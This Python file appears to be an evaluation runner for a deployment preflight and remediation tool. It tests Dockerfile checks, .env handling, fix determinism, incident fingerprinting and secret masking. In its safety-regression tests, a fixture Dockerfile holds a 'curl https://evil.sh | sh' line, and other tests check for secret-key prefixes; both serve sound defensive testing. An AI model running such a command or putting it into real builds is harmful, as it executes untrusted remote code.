"""
v10 Backbone Eval Runner (§38).

각 카테고리별 평가 함수를 호출, 결과를 모아 EvalV10Report 로 반환.
synthetic workspace 를 ``tempfile.TemporaryDirectory`` 로 만들어 격리.
"""

from __future__ import annotations

import tempfile
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional

try:
    from preflight import StaticPreflightRunner
    from remediation import (
        apply_proposal,
        compute_fingerprint,
        generate_proposal_for_blocker,
        generate_proposals,
    )
    from incident_memory import (
        build_incident_fingerprint,
        init_incident_memory_table,
        learn_from_remediation,
        match_incident,
        mask_for_fingerprint,
    )
    from persistence import RecoderDB
    from schemas import (
        ContractProjectMeta,
        ContractRuntime,
        ContractStack,
        PreflightBlocker,
        PreflightCheckCode,
        PreflightRun,
        PreflightSeverity,
        PreflightStatus,
        ReleaseContract,
        RemediationRun,
    )
except ImportError:  # pragma: no cover
    from core.preflight import StaticPreflightRunner  # type: ignore
    from core.remediation import (  # type: ignore
        apply_proposal,
        compute_fingerprint,
        generate_proposal_for_blocker,
        generate_proposals,
    )
    from core.incident_memory import (  # type: ignore
        build_incident_fingerprint,
        init_incident_memory_table,
        learn_from_remediation,
        match_incident,
        mask_for_fingerprint,
    )
    from core.persistence import RecoderDB  # type: ignore
    from core.schemas import (  # type: ignore
        ContractProjectMeta,
        ContractRuntime,
        ContractStack,
        PreflightBlocker,
        PreflightCheckCode,
        PreflightRun,
        PreflightSeverity,
        PreflightStatus,
        ReleaseContract,
        RemediationRun,
    )

from .categories import CATEGORY_WEIGHTS, V10EvalCategory


# ---------------------------------------------------------------------------
# Result models
# ---------------------------------------------------------------------------


@dataclass
class EvalV10Result:
    """단일 케이스 결과."""
    category: V10EvalCategory
    case_id: str
    passed: bool
    duration_ms: int = 0
    details: dict = field(default_factory=dict)
    error: Optional[str] = None


@dataclass
class EvalV10Report:
    """전체 평가 보고서."""
    results: list[EvalV10Result] = field(default_factory=list)
    started_at_ms: int = 0
    finished_at_ms: int = 0

    @property
    def total(self) -> int:
        return len(self.results)

    @property
    def passed(self) -> int:
        return sum(1 for r in self.results if r.passed)

    @property
    def failed(self) -> int:
        return self.total - self.passed

    @property
    def pass_rate(self) -> float:
        return self.passed / self.total if self.total > 0 else 0.0

    @property
    def by_category(self) -> dict[str, dict]:
        out: dict[str, dict] = {}
        for cat in V10EvalCategory:
            crs = [r for r in self.results if r.category == cat]
            if not crs:
                continue
            p = sum(1 for r in crs if r.passed)
            out[cat.value] = {
                "total":     len(crs),
                "passed":    p,
                "failed":    len(crs) - p,
                "pass_rate": p / len(crs) if crs else 0.0,
            }
        return out

    @property
    def safety_violations(self) -> int:
        """SAFETY_REGRESSIONS 카테고리의 실패 개수 — absolute gate."""
        return sum(
            1 for r in self.results
            if r.category == V10EvalCategory.SAFETY_REGRESSIONS and not r.passed
        )

    @property
    def weighted_pass_rate(self) -> float:
        """카테고리 가중 평균 통과율."""
        weighted_sum = 0.0
        weight_total = 0.0
        for cat in V10EvalCategory:
            crs = [r for r in self.results if r.category == cat]
            if not crs:
                continue
            cat_rate = sum(1 for r in crs if r.passed) / len(crs)
            w = CATEGORY_WEIGHTS.get(cat, 1.0)
            weighted_sum += cat_rate * w
            weight_total += w
        return weighted_sum / weight_total if weight_total > 0 else 0.0


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _find_free_port(start: int = 47891, end: int = 47999) -> int:
    """평가 결정성 보장 — 사용 중이지 않은 high port 를 찾는다.

    HOST_PORT_CONFLICT 검사가 평가 PC 환경에 의존하지 않도록 사용자 PC 에서
    잘 안 쓰이는 고번호 포트 (47891~47999) 중 첫 비어있는 것 사용.
    """
    import socket
    for port in range(start, end + 1):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(0.1)
                # bind 시도해서 OK 면 free port. 즉시 close.
                s.bind(("127.0.0.1", port))
                return port
        except OSError:
            continue
    return start  # fallback


def _make_contract(
    stack: ContractStack = ContractStack.PYTHON_FASTAPI,
    host_port: Optional[int] = None,
    app_port: int = 8000,
    required_env: Optional[list[str]] = None,
) -> ReleaseContract:
    if host_port is None:
        host_port = _find_free_port()
    c = ReleaseContract(
        project=ContractProjectMeta(name="eval_proj", stack=stack),
        runtime=ContractRuntime(host_port=host_port, app_port=app_port),
        contract_hash="evalhash" * 8,
    )
    if required_env is not None:
        c.preflight.required_env = required_env
    return c


def _now_ms() -> int:
    return int(time.monotonic() * 1000)


# ---------------------------------------------------------------------------
# Category 1: PREFLIGHT_ACCURACY
# ---------------------------------------------------------------------------


def _eval_preflight_accuracy(results: list[EvalV10Result]) -> None:
    """synthetic workspace 별 12 검사가 적절히 동작하는지."""

    # 1.1 빈 workspace → MISSING_DOCKERFILE + APP_ENTRYPOINT_NOT_FOUND blocker
    t0 = _now_ms()
    case_id = "empty_workspace_blocks_dockerfile_and_entrypoint"
    try:
        with tempfile.TemporaryDirectory() as td:
            contract = _make_contract()
            runner = StaticPreflightRunner(td, contract)
            res = runner.run_sync()
            blocker_codes = {b.code for b in res.blockers}
            ok = (
                PreflightCheckCode.MISSING_DOCKERFILE in blocker_codes
                and PreflightCheckCode.APP_ENTRYPOINT_NOT_FOUND in blocker_codes
                and res.status == PreflightStatus.BLOCKED
            )
        results.append(EvalV10Result(
            V10EvalCategory.PREFLIGHT_ACCURACY,
            case_id, ok, _now_ms() - t0,
            details={"blockers": [c.value for c in blocker_codes], "status": res.status.value},
        ))
    except Exception as exc:
        results.append(EvalV10Result(
            V10EvalCategory.PREFLIGHT_ACCURACY, case_id, False,
            _now_ms() - t0, error=str(exc),
        ))

    # 1.2 healthy workspace → PASSED or WARN
    # contract 기본값: required_env=["PORT"], health_check_path="/health"
    # → eval workspace 가 둘을 충족하도록 구성.
    t0 = _now_ms()
    case_id = "healthy_workspace_passes_or_warns"
    try:
        with tempfile.TemporaryDirectory(ignore_cleanup_errors=True) as td:
            ws = Path(td)
            (ws / "Dockerfile").write_text(
                "FROM python:3.11-slim\nWORKDIR /app\nEXPOSE 8000\n"
                'CMD ["uvicorn","app.main:app","--host","0.0.0.0","--port","8000"]\n',
                encoding="utf-8",
            )
            (ws / ".gitignore").write_text(".env\n", encoding="utf-8")
            (ws / ".env").write_text("PORT=8000\n", encoding="utf-8")
            (ws / "app").mkdir()
            # ContractRuntime.health_check_path 기본 = "/health" — 정확히 일치시킴
            (ws / "app" / "main.py").write_text(
                "from fastapi import FastAPI\napp = FastAPI()\n"
                "@app.get('/health')\ndef health(): return {'status': 'ok'}\n",
                encoding="utf-8",
            )
            (ws / "requirements.txt").write_text("fastapi==0.110.0\nuvicorn==0.27.0\n", encoding="utf-8")
            contract = _make_contract()  # required_env=["PORT"], health=/health 기본값 사용
            res = StaticPreflightRunner(str(ws), contract).run_sync()
            ok = res.status in (PreflightStatus.PASSED, PreflightStatus.WARN)
        results.append(EvalV10Result(
            V10EvalCategory.PREFLIGHT_ACCURACY, case_id, ok, _now_ms() - t0,
            details={
                "status": res.status.value,
                "score": res.score,
                "blockers": [
                    {"code": b.code.value, "severity": b.severity.value, "message": b.message[:120]}
                    for b in res.blockers
                ],
                "warnings": [
                    {"code": w.code.value, "severity": w.severity.value}
                    for w in res.warnings
                ],
            },
        ))
    except Exception as exc:
        results.append(EvalV10Result(
            V10EvalCategory.PREFLIGHT_ACCURACY, case_id, False,
            _now_ms() - t0, error=str(exc),
        ))

    # 1.3 .env without .gitignore → CRITICAL blocker
    t0 = _now_ms()
    case_id = "env_without_gitignore_critical_blocker"
    try:
        with tempfile.TemporaryDirectory() as td:
            ws = Path(td)
            (ws / ".env").write_text("API_KEY=secretvalue\n", encoding="utf-8")
            contract = _make_contract()
            res = StaticPreflightRunner(str(ws), contract).run_sync()
            critical_codes = {
                b.code for b in res.blockers
                if b.severity == PreflightSeverity.CRITICAL
            }
            ok = PreflightCheckCode.ENV_FILE_NOT_GITIGNORED in critical_codes
        results.append(EvalV10Result(
            V10EvalCategory.PREFLIGHT_ACCURACY, case_id, ok, _now_ms() - t0,
            details={"critical_blockers": [c.value for c in critical_codes]},
        ))
    except Exception as exc:
        results.append(EvalV10Result(
            V10EvalCategory.PREFLIGHT_ACCURACY, case_id, False,
            _now_ms() - t0, error=str(exc),
        ))


# ---------------------------------------------------------------------------
# Category 2: REMEDIATION_DETERMINISM
# ---------------------------------------------------------------------------


def _eval_remediation_determinism(results: list[EvalV10Result]) -> None:
    """같은 입력 → 같은 proposal_id (모든 12 blocker code 에 대해)."""
    for code in PreflightCheckCode:
        t0 = _now_ms()
        case_id = f"determinism_{code.value}"
        try:
            blocker = PreflightBlocker(code=code, message="eval", severity=PreflightSeverity.HIGH)
            contract = _make_contract(required_env=["A", "B"])
            with tempfile.TemporaryDirectory() as td:
                ids = {
                    generate_proposal_for_blocker(blocker, contract, Path(td)).proposal_id
                    for _ in range(5)
                }
            ok = len(ids) == 1
            results.append(EvalV10Result(
                V10EvalCategory.REMEDIATION_DETERMINISM, case_id, ok, _now_ms() - t0,
                details={"unique_ids": list(ids)},
            ))
        except Exception as exc:
            results.append(EvalV10Result(
                V10EvalCategory.REMEDIATION_DETERMINISM, case_id, False,
                _now_ms() - t0, error=str(exc),
            ))


# ---------------------------------------------------------------------------
# Category 3: REMEDIATION_APPLY
# ---------------------------------------------------------------------------


def _eval_remediation_apply(results: list[EvalV10Result]) -> None:
    """auto_apply_available 인 proposal 적용 후 preflight 재실행 → 해당 blocker 사라짐."""

    # 3.1 MISSING_DOCKERFILE 자동 적용
    t0 = _now_ms()
    case_id = "missing_dockerfile_auto_apply_resolves"
    try:
        with tempfile.TemporaryDirectory() as td:
            ws = Path(td)
            (ws / ".gitignore").write_text(".env\n", encoding="utf-8")
            (ws / "app").mkdir()
            (ws / "app" / "main.py").write_text(
                "from fastapi import FastAPI\napp = FastAPI()\n"
                "@app.get('/healthz')\ndef hz(): return {}\n",
                encoding="utf-8",
            )
            (ws / "requirements.txt").write_text("fastapi==0.110.0\n", encoding="utf-8")
            contract = _make_contract()

            run_before = StaticPreflightRunner(str(ws), contract).run_sync()
            blocker_codes_before = {b.code for b in run_before.blockers}
            assert PreflightCheckCode.MISSING_DOCKERFILE in blocker_codes_before

            # Apply
            blocker = next(b for b in run_before.blockers if b.code == PreflightCheckCode.MISSING_DOCKERFILE)
            proposal = generate_proposal_for_blocker(blocker, contract, ws)
            apply_proposal(proposal, ws)

            # Re-run
            run_after = StaticPreflightRunner(str(ws), contract).run_sync()
            blocker_codes_after = {b.code for b in run_after.blockers}
            ok = PreflightCheckCode.MISSING_DOCKERFILE not in blocker_codes_after
        results.append(EvalV10Result(
            V10EvalCategory.REMEDIATION_APPLY, case_id, ok, _now_ms() - t0,
            details={
                "before": [c.value for c in blocker_codes_before],
                "after":  [c.value for c in blocker_codes_after],
            },
        ))
    except Exception as exc:
        results.append(EvalV10Result(
            V10EvalCategory.REMEDIATION_APPLY, case_id, False,
            _now_ms() - t0, error=str(exc),
        ))

    # 3.2 ENV_FILE_NOT_GITIGNORED 자동 적용
    t0 = _now_ms()
    case_id = "env_not_gitignored_auto_apply_resolves"
    try:
        with tempfile.TemporaryDirectory() as td:
            ws = Path(td)
            (ws / ".env").write_text("KEY=val\n", encoding="utf-8")
            (ws / "Dockerfile").write_text("FROM python:3.11-slim\nEXPOSE 8000\n", encoding="utf-8")
            (ws / "app").mkdir()
            (ws / "app" / "main.py").write_text(
                "from fastapi import FastAPI\napp = FastAPI()\n"
                "@app.get('/healthz')\ndef hz(): return {}\n",
                encoding="utf-8",
            )
            contract = _make_contract()
            run_before = StaticPreflightRunner(str(ws), contract).run_sync()
            blocker = next(b for b in run_before.blockers if b.code == PreflightCheckCode.ENV_FILE_NOT_GITIGNORED)
            proposal = generate_proposal_for_blocker(blocker, contract, ws)
            apply_proposal(proposal, ws)
            run_after = StaticPreflightRunner(str(ws), contract).run_sync()
            ok = not any(b.code == PreflightCheckCode.ENV_FILE_NOT_GITIGNORED for b in run_after.blockers)
        results.append(EvalV10Result(
            V10EvalCategory.REMEDIATION_APPLY, case_id, ok, _now_ms() - t0,
        ))
    except Exception as exc:
        results.append(EvalV10Result(
            V10EvalCategory.REMEDIATION_APPLY, case_id, False,
            _now_ms() - t0, error=str(exc),
        ))


# ---------------------------------------------------------------------------
# Category 4: INCIDENT_FINGERPRINT
# ---------------------------------------------------------------------------


def _eval_incident_fingerprint(results: list[EvalV10Result]) -> None:
    cases: list[tuple[str, callable, bool]] = [
        # (case_id, lambda → bool, expected_pass)
        (
            "same_input_same_fp",
            lambda: build_incident_fingerprint(
                error_type="ModuleNotFoundError",
                error_message="No module named 'foo'",
                last_file="x.py",
            ) == build_incident_fingerprint(
                error_type="ModuleNotFoundError",
                error_message="No module named 'foo'",
                last_file="x.py",
            ),
            True,
        ),
        (
            "different_error_type_different_fp",
            lambda: build_incident_fingerprint(
                error_type="ModuleNotFoundError", error_message="msg"
            ) != build_incident_fingerprint(
                error_type="ConnectionError", error_message="msg"
            ),
            True,
        ),
        (
            "workspace_path_masked",
            lambda: build_incident_fingerprint(
                error_type="E", error_message="path C:\\Users\\alice\\app.py")
            == build_incident_fingerprint(
                error_type="E", error_message="path C:\\Users\\bob\\app.py"),
            True,
        ),
        (
            "quoted_value_masked",
            lambda: build_incident_fingerprint(
                error_type="E", error_message='Invalid: "ABC123"')
            == build_incident_fingerprint(
                error_type="E", error_message='Invalid: "XYZ789"'),
            True,
        ),
        (
            "raw_secret_not_in_masked",
            lambda: "AKIAIOSFODNN7EXAMPLE" not in mask_for_fingerprint(
                "Error: AKIAIOSFODNN7EXAMPLE leaked"
            ),
            True,
        ),
    ]
    for case_id, fn, expected in cases:
        t0 = _now_ms()
        try:
            ok = fn() == expected
            results.append(EvalV10Result(
                V10EvalCategory.INCIDENT_FINGERPRINT, case_id, ok, _now_ms() - t0,
            ))
        except Exception as exc:
            results.append(EvalV10Result(
                V10EvalCategory.INCIDENT_FINGERPRINT, case_id, False,
                _now_ms() - t0, error=str(exc),
            ))


# ---------------------------------------------------------------------------
# Category 5: INCIDENT_MATCH
# ---------------------------------------------------------------------------


def _mk_db(td: str) -> RecoderDB:
    """평가용 임시 DB. 호출자가 cleanup_db() 로 마무리해야 한다 (Windows WAL lock)."""
    db = RecoderDB(Path(td) / "test.db", check_same_thread=True)
    init_incident_memory_table(db)
    return db


def _cleanup_db(db: RecoderDB) -> None:
    """Windows 에서 TemporaryDirectory cleanup 전 WAL 파일 잠금 해제."""
    try:
        db.checkpoint_and_close_wal()
    except Exception:
        pass


def _eval_incident_match(results: list[EvalV10Result]) -> None:
    # 5.1 exact project match → confidence 1.0
    t0 = _now_ms()
    case_id = "exact_match_confidence_1"
    db = None
    try:
        # Python 3.12+ : ignore_cleanup_errors 로 WAL lock 잔존 케이스 흡수
        with tempfile.TemporaryDirectory(ignore_cleanup_errors=True) as td:
            db = _mk_db(td)
            fp = build_incident_fingerprint(
                error_type="ImportError",
                error_message="cannot import",
                last_file="m.py",
            )
            learn_from_remediation(
                db,
                remediation_run=RemediationRun(
                    preflight_run_id="pre_x", proposal_id="rem_x", success=True,
                ),
                fingerprint=fp, symptom="s", root_cause="rc", successful_fix="fix",
                project_id="P", user_consent=True,
            )
            matches = match_incident(db, fingerprint=fp, project_id="P")
            ok = len(matches) == 1 and matches[0].confidence == 1.0
            _cleanup_db(db)
        results.append(EvalV10Result(
            V10EvalCategory.INCIDENT_MATCH, case_id, ok, _now_ms() - t0,
        ))
    except Exception as exc:
        if db is not None:
            _cleanup_db(db)
        results.append(EvalV10Result(
            V10EvalCategory.INCIDENT_MATCH, case_id, False,
            _now_ms() - t0, error=str(exc),
        ))

    # 5.2 cross-project fallback → confidence 0.7
    t0 = _now_ms()
    case_id = "cross_project_fallback_confidence_07"
    db = None
    try:
        with tempfile.TemporaryDirectory(ignore_cleanup_errors=True) as td:
            db = _mk_db(td)
            fp = build_incident_fingerprint(error_type="E", error_message="m")
            learn_from_remediation(
                db,
                remediation_run=RemediationRun(
                    preflight_run_id="pre_x", proposal_id="rem_y", success=True,
                ),
                fingerprint=fp, symptom="s", root_cause="rc", successful_fix="f",
                project_id="OTHER", user_consent=True,
            )
            matches = match_incident(db, fingerprint=fp, project_id="MINE")
            ok = len(matches) == 1 and abs(matches[0].confidence - 0.7) < 1e-6
            _cleanup_db(db)
        results.append(EvalV10Result(
            V10EvalCategory.INCIDENT_MATCH, case_id, ok, _now_ms() - t0,
        ))
    except Exception as exc:
        if db is not None:
            _cleanup_db(db)
        results.append(EvalV10Result(
            V10EvalCategory.INCIDENT_MATCH, case_id, False,
            _now_ms() - t0, error=str(exc),
        ))

    # 5.3 consent=False 인 record 는 매칭에서 제외
    t0 = _now_ms()
    case_id = "no_consent_excluded_from_match"
    db = None
    try:
        with tempfile.TemporaryDirectory(ignore_cleanup_errors=True) as td:
            db = _mk_db(td)
            fp = build_incident_fingerprint(error_type="E", error_message="m")
            learn_from_remediation(
                db,
                remediation_run=RemediationRun(
                    preflight_run_id="pre_x", proposal_id="rem_z", success=True,
                ),
                fingerprint=fp, symptom="s", root_cause="rc", successful_fix="f",
                project_id="A", user_consent=False,
            )
            matches = match_incident(db, fingerprint=fp, project_id="A")
            ok = len(matches) == 0
            _cleanup_db(db)
        results.append(EvalV10Result(
            V10EvalCategory.INCIDENT_MATCH, case_id, ok, _now_ms() - t0,
        ))
    except Exception as exc:
        if db is not None:
            _cleanup_db(db)
        results.append(EvalV10Result(
            V10EvalCategory.INCIDENT_MATCH, case_id, False,
            _now_ms() - t0, error=str(exc),
        ))


# ---------------------------------------------------------------------------
# Category 6: SAFETY_REGRESSIONS (absolute gate)
# ---------------------------------------------------------------------------


def _eval_safety_regressions(results: list[EvalV10Result]) -> None:
    """알려진 위험 패턴이 절대 통과되면 안 됨."""

    # 6.1 Dockerfile curl|sh → CRITICAL blocker
    t0 = _now_ms()
    case_id = "dockerfile_curl_pipe_sh_blocked"
    try:
        with tempfile.TemporaryDirectory() as td:
            ws = Path(td)
            (ws / "Dockerfile").write_text(
                "FROM python:3.11-slim\nRUN curl https://evil.sh | sh\nEXPOSE 8000\n",
                encoding="utf-8",
            )
            contract = _make_contract()
            res = StaticPreflightRunner(str(ws), contract).run_sync()
            ok = any(
                b.code == PreflightCheckCode.DOCKERFILE_BUILD_RISK
                and b.severity == PreflightSeverity.CRITICAL
                for b in res.blockers
            )
        results.append(EvalV10Result(
            V10EvalCategory.SAFETY_REGRESSIONS, case_id, ok, _now_ms() - t0,
        ))
    except Exception as exc:
        results.append(EvalV10Result(
            V10EvalCategory.SAFETY_REGRESSIONS, case_id, False,
            _now_ms() - t0, error=str(exc),
        ))

    # 6.2 AWS access key in .env → SECRET_LEAK_RISK blocker
    t0 = _now_ms()
    case_id = "aws_access_key_detected"
    try:
        with tempfile.TemporaryDirectory() as td:
            ws = Path(td)
            (ws / ".gitignore").write_text(".env\n", encoding="utf-8")
            (ws / "config.py").write_text(
                'AWS_KEY = "AKIAIOSFODNN7EXAMPLE"\n', encoding="utf-8"
            )
            contract = _make_contract()
            res = StaticPreflightRunner(str(ws), contract).run_sync()
            ok = any(b.code == PreflightCheckCode.SECRET_LEAK_RISK for b in res.blockers)
        results.append(EvalV10Result(
            V10EvalCategory.SAFETY_REGRESSIONS, case_id, ok, _now_ms() - t0,
        ))
    except Exception as exc:
        results.append(EvalV10Result(
            V10EvalCategory.SAFETY_REGRESSIONS, case_id, False,
            _now_ms() - t0, error=str(exc),
        ))

    # 6.3 SECRET_LEAK_RISK proposal 에 secret 원문 노출 없음
    t0 = _now_ms()
    case_id = "secret_leak_proposal_no_raw_value"
    try:
        with tempfile.TemporaryDirectory() as td:
            blocker = PreflightBlocker(
                code=PreflightCheckCode.SECRET_LEAK_RISK,
                message="AKIAIOSFODNN7EXAMPLE 패턴 발견",
                severity=PreflightSeverity.HIGH,
            )
            contract = _make_contract()
            proposal = generate_proposal_for_blocker(blocker, contract, Path(td))
            text = proposal.model_dump_json() if proposal else ""
            ok = (
                proposal is not None
                and "AKIA" not in text  # AWS key prefix
                and "ghp_" not in text
                and "sk_live" not in text
            )
        results.append(EvalV10Result(
            V10EvalCategory.SAFETY_REGRESSIONS, case_id, ok, _now_ms() - t0,
        ))
    except Exception as exc:
        results.append(EvalV10Result(
            V10EvalCategory.SAFETY_REGRESSIONS, case_id, False,
            _now_ms() - t0, error=str(exc),
        ))


# ---------------------------------------------------------------------------
# Public entry
# ---------------------------------------------------------------------------


def run_v10_eval() -> EvalV10Report:
    """모든 카테고리 평가 실행."""
    report = EvalV10Report(started_at_ms=_now_ms())
    _eval_preflight_accuracy(report.results)
    _eval_remediation_determinism(report.results)
    _eval_remediation_apply(report.results)
    _eval_incident_fingerprint(report.results)
    _eval_incident_match(report.results)
    _eval_safety_regressions(report.results)
    report.finished_at_ms = _now_ms()
    return report
